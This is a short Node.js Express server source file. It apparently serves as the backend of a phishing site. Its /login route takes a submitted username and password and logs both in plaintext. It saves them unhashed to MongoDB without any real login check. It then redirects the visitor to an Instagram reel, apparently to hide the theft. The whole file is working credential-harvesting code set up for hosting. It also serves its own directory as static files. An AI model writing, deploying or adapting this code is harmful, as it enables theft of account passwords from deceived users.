const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const mongoose = require("mongoose");
require("dotenv").config();

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Check Mongo URI
if (!process.env.MONGO_URI) {
  console.log("MONGO_URI is missing!");
  process.exit(1);
}

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => {
    console.log("MongoDB Connected");
  })
  .catch((err) => {
    console.log("MongoDB Error:");
    console.log(err);
  });

// Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model("User", userSchema);

// Home Route
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Login Route
app.post("/login", async (req, res) => {
  try {
    const { username, password } = req.body;

    console.log("Received:", username, password);

    const newUser = new User({
      username,
      password,
    });

    await newUser.save();

    console.log("User saved!");

    // Redirect to Instagram reel
    res.redirect(
      "https://www.instagram.com/reel/DXH9OJcjdb5/?utm_source=ig_web_copy_link"
    );

  } catch (error) {
    console.log("Save Error:");
    console.log(error);

    res.status(500).send("Error saving data");
  }
});

// PORT for Render
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});